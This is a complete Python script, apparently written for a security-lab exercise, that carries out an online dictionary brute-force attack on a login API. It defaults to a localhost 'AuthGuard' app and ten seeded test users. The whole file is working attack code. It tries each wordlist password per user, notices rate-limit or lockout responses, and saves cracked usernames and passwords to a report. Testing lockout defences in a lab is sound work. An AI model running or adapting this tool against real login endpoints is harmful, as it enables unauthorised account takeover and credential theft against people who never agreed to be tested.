#!/usr/bin/env python3


import requests
import time
import argparse
import sys
import os
from datetime import datetime

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------
DEFAULT_URL      = "http://localhost:3000/api/login"
DEFAULT_WORDLIST = os.path.join(os.path.dirname(__file__), "wordlist.txt")
REQUEST_DELAY    = 0.05   # seconds between requests per user

# All seeded test accounts (from authguard/scripts/seed.js)
TARGET_USERS = [
    "alice", "bob", "charlie", "diana", "eve",
    "frank", "grace", "henry", "isabella", "jack",
]

# ---------------------------------------------------------------------------
# Terminal colours
# ---------------------------------------------------------------------------
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"


def banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════╗
║       Online Brute-Force Attack Tool         ║
║       IS Security Lab — Phase 2              ║
║       Mode: ALL USERS — one shot             ║
╚══════════════════════════════════════════════╝{RESET}
""")


def load_wordlist(path: str) -> list[str]:
    if not os.path.exists(path):
        print(f"{RED}[!] Wordlist not found: {path}{RESET}")
        sys.exit(1)
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        words = [line.strip() for line in f if line.strip()]
    print(f"[*] Loaded {len(words)} passwords from {path}")
    return words


def try_login(session: requests.Session, url: str, username: str, password: str):
    """
    Send one login attempt.
    Returns (success: bool, status_code: int).
    """
    try:
        resp = session.post(
            url,
            json={"username": username, "password": password},
            timeout=10,
        )
        data = {}
        if "application/json" in resp.headers.get("content-type", ""):
            data = resp.json()

        success = resp.status_code == 200 and bool(data.get("success"))
        return success, resp.status_code

    except requests.exceptions.ConnectionError:
        print(f"\n{RED}[!] Connection refused — is the server running?")
        print(f"    Start it:  cd authguard && node server.js{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        return False, 0
    except Exception as exc:
        print(f"\n{RED}[!] Error: {exc}{RESET}")
        return False, 0


def attack_user(session: requests.Session, url: str, username: str,
                wordlist: list[str], delay: float) -> dict:
    """Try every password in the wordlist against one username."""
    found_password = None
    blocked_at     = None
    attempts       = 0

    for password in wordlist:
        attempts += 1
        print(f"\r  [{username:<10}] attempt {attempts:>4}/{len(wordlist)}  "
              f"testing '{password}' ...", end="", flush=True)

        success, status_code = try_login(session, url, username, password)

        if success:
            found_password = password
            print(f"\r  {GREEN}{BOLD}[CRACKED] {username:<10} => '{password}' "
                  f"(attempt #{attempts}){RESET}")
            break

        if status_code in (429, 403):
            blocked_at = attempts
            print(f"\r  {YELLOW}[BLOCKED] {username:<10}  server returned {status_code} "
                  f"after {blocked_at} attempts{RESET}")
            break

        if delay > 0:
            time.sleep(delay)

    if not found_password and not blocked_at:
        print(f"\r  {RED}[FAILED]  {username:<10}  not found in wordlist{RESET}          ")

    return {
        "username":   username,
        "attempts":   attempts,
        "found":      found_password,
        "blocked_at": blocked_at,
    }


def run_attack(url: str, users: list[str], wordlist: list[str], delay: float):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (BruteForceBot/1.0)"})

    print(f"\n{BOLD}Target URL  :{RESET} {url}")
    print(f"{BOLD}Users       :{RESET} {', '.join(users)}")
    print(f"{BOLD}Passwords   :{RESET} {len(wordlist)}")
    print(f"{BOLD}Delay/req   :{RESET} {delay}s")
    print("=" * 54)

    results    = []
    start_time = time.time()

    for i, username in enumerate(users, 1):
        print(f"\n[{i}/{len(users)}] Attacking: {BOLD}{username}{RESET}")
        result = attack_user(session, url, username, wordlist, delay)
        results.append(result)

    elapsed = time.time() - start_time

    # ------------------------------------------------------------------
    # Final summary
    # ------------------------------------------------------------------
    cracked  = [r for r in results if r["found"]]
    blocked  = [r for r in results if r["blocked_at"]]
    failed   = [r for r in results if not r["found"] and not r["blocked_at"]]
    total_attempts = sum(r["attempts"] for r in results)

    print(f"\n\n{CYAN}{BOLD}{'='*54}")
    print("              FULL ATTACK SUMMARY")
    print(f"{'='*54}{RESET}")
    print(f"  Target URL     : {url}")
    print(f"  Users targeted : {len(users)}")
    print(f"  Total attempts : {total_attempts}")
    print(f"  Time elapsed   : {elapsed:.2f}s")
    print(f"  Avg per user   : {elapsed/len(users):.2f}s")
    print()

    if cracked:
        print(f"  {GREEN}{BOLD}CRACKED ({len(cracked)}/{len(users)}):{RESET}")
        for r in cracked:
            print(f"    {GREEN}✓  {r['username']:<12} => '{r['found']}'  "
                  f"(#{r['attempts']} attempts){RESET}")

    if blocked:
        print(f"\n  {YELLOW}BLOCKED ({len(blocked)}/{len(users)}):{RESET}")
        for r in blocked:
            print(f"    {YELLOW}⚠  {r['username']:<12} locked after {r['blocked_at']} attempts{RESET}")

    if failed:
        print(f"\n  {RED}NOT FOUND ({len(failed)}/{len(users)}):{RESET}")
        for r in failed:
            print(f"    {RED}✗  {r['username']}{RESET}")

    print(f"\n{CYAN}{BOLD}{'='*54}{RESET}\n")

    save_report(url, users, wordlist, results, total_attempts, elapsed)


def save_report(url, users, wordlist, results, total_attempts, elapsed):
    """Write a plain-text report to attack/reports/<timestamp>.txt"""
    reports_dir = os.path.join(os.path.dirname(__file__), "reports")
    os.makedirs(reports_dir, exist_ok=True)

    timestamp   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_path = os.path.join(reports_dir, f"attack_{timestamp}.txt")

    cracked = [r for r in results if r["found"]]
    blocked = [r for r in results if r["blocked_at"]]
    failed  = [r for r in results if not r["found"] and not r["blocked_at"]]

    lines = []
    lines.append("=" * 54)
    lines.append("       IS SECURITY LAB — BRUTE FORCE ATTACK REPORT")
    lines.append("=" * 54)
    lines.append(f"  Date/Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  Target URL     : {url}")
    lines.append(f"  Users targeted : {len(users)}")
    lines.append(f"  Wordlist size  : {len(wordlist)} passwords")
    lines.append(f"  Total attempts : {total_attempts}")
    lines.append(f"  Time elapsed   : {elapsed:.2f}s")
    lines.append(f"  Avg per user   : {elapsed / len(users):.2f}s")
    lines.append("")
    lines.append("-" * 54)
    lines.append(f"  CRACKED  : {len(cracked)}/{len(users)} accounts")
    lines.append(f"  BLOCKED  : {len(blocked)}/{len(users)} accounts")
    lines.append(f"  FAILED   : {len(failed)}/{len(users)} accounts")
    lines.append("-" * 54)

    if cracked:
        lines.append("")
        lines.append("  [CRACKED ACCOUNTS]")
        for r in cracked:
            lines.append(f"    username : {r['username']}")
            lines.append(f"    password : {r['found']}")
            lines.append(f"    attempts : {r['attempts']}")
            lines.append("")

    if blocked:
        lines.append("  [BLOCKED ACCOUNTS]")
        for r in blocked:
            lines.append(f"    username : {r['username']}  "
                         f"(blocked after {r['blocked_at']} attempts)")
        lines.append("")

    if failed:
        lines.append("  [NOT FOUND]")
        for r in failed:
            lines.append(f"    username : {r['username']}")
        lines.append("")

    lines.append("=" * 54)

    report_text = "\n".join(lines)

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(report_text)

    print(f"[*] Report saved → {report_path}\n")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Dictionary attack against all AuthGuard test users.")
    parser.add_argument("--url",      default=DEFAULT_URL,
                        help="Target login URL")
    parser.add_argument("--wordlist", default=DEFAULT_WORDLIST,
                        help="Path to password wordlist")
    parser.add_argument("--delay",    type=float, default=REQUEST_DELAY,
                        help="Delay in seconds between requests (default 0.05)")
    args = parser.parse_args()

    banner()
    wordlist = load_wordlist(args.wordlist)
    run_attack(args.url, TARGET_USERS, wordlist, args.delay)


if __name__ == "__main__":
    main()
